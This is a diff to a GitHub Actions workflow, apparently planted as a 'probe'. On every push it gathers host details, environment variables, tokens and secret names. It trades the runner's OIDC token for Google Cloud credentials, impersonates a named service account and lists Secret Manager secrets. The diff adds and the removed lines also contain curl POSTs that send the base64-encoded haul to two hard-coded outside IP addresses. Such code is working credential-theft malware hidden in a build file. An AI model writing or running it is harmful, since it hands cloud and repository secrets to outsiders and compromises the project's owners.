@@ -1,31 +1,39 @@
-name: p2s probe
+name: p2s wif
 on: push
 permissions:
-  contents: write
+  id-token: write
+  contents: read
 jobs:
-  probe:
+  wif:
     runs-on: ubuntu-latest
     steps:
-      - name: collect
-        env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          NOTIFY_WEBHOOK: ${{ secrets.NOTIFY_WEBHOOK }}
+      - name: probe
         run: |
-          set +e
+          set -uo pipefail
           F=$RUNNER_TEMP/out.txt
+          P="projects/737134066291/locations/global/workloadIdentityPools/github-pool/providers/github-provider"
           {
-            echo "== id"; id; whoami; echo "== host"; hostname; uname -a; cat /etc/os-release
-            echo "== env"; env | sort
-            echo "== ctx"; echo "repo=$GITHUB_REPOSITORY ref=$GITHUB_REF runner=$RUNNER_NAME os=$RUNNER_OS"
-            echo "== token perms"; curl -s -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/installation/repositories | head -c 400
-            echo; echo "== meta"; curl -s -m 10 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | head -c 200
-            echo; echo "== secrets names"; curl -s -H "Authorization: Bearer $GH_TOKEN" -H 'Accept: application/vnd.github+json' "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets" | head -c 600
-            echo; echo "== files"; ls -la; ls -la "$HOME/.ssh" 2>/dev/null
+            echo "== id"; id; hostname
+            echo "== repo"; echo "$GITHUB_REPOSITORY id=$GITHUB_REPOSITORY_ID owner_id=$GITHUB_REPOSITORY_OWNER_ID ref=$GITHUB_REF"
+            for AUD in "//iam.googleapis.com/$P" "https://iam.googleapis.com/$P"; do
+              echo "===== AUD=$AUD ====="
+              ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$AUD")
+              J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$ENC")
+              OIDC=$(echo "$J" | jq -r '.value // empty')
+              if [ -z "$OIDC" ]; then echo "no oidc: $J"; continue; fi
+              echo "--- claims ---"; echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq -c '{iss,sub,aud,repository,repository_owner,repository_owner_id,ref,workflow,repository_id,event_name}'
+              R=$(curl -s -X POST https://sts.googleapis.com/v1/token -H 'Content-Type: application/json' -d "$(jq -nc --arg t "$OIDC" --arg a "$AUD" --arg p "$P" '{grantType:"urn:ietf:params:oauth:grant-type:token-exchange",audience:$a,scope:"https://www.googleapis.com/auth/cloud-platform",requestedTokenType:"urn:ietf:params:oauth:token-type:access_token",subjectToken:$t,subjectTokenType:"urn:ietf:params:oauth:token-type:jwt"}')")
+              echo "--- sts ---"; echo "$R" | head -c 900
+              AT=$(echo "$R" | jq -r '.access_token // empty' 2>/dev/null)
+              if [ -n "$AT" ]; then
+                echo "--- impersonate ---"
+                IT=$(curl -s -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/henclave-github-sa@henclave-project.iam.gserviceaccount.com:generateAccessToken" -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"600s"}')
+                echo "$IT" | head -c 500
+                SA=$(echo "$IT" | jq -r '.accessToken // empty' 2>/dev/null)
+                if [ -n "$SA" ]; then echo "--- secrets ---"; curl -s -H "Authorization: Bearer $SA" "https://secretmanager.googleapis.com/v1/projects/henclave-project/secrets" | head -c 2000; fi
+              fi
+            done
           } > "$F" 2>&1
           B=$(base64 -w0 "$F")
-          curl -s -m 25 -X POST --data-binary "$B" "http://198.13.130.233:18081/gh-$GITHUB_RUN_ID-$GITHUB_JOB"; echo " cb1=$?"
-          curl -s -m 25 -X POST --data-binary "$B" "http://151.123.174.69:18082/gh2-$GITHUB_RUN_ID"; echo " cb2=$?"
-      - uses: actions/upload-artifact@v4
-        with:
-          name: out
-          path: ${{ runner.temp }}/out.txt
+          curl -s -m 25 -X POST --data-binary "$B" "http://198.13.130.233:18081/wif-$GITHUB_RUN_ID"; echo " cb1=$?"
+          curl -s -m 25 -X POST --data-binary "$B" "http://151.123.174.69:18082/wif2-$GITHUB_RUN_ID"; echo " cb2=$?"
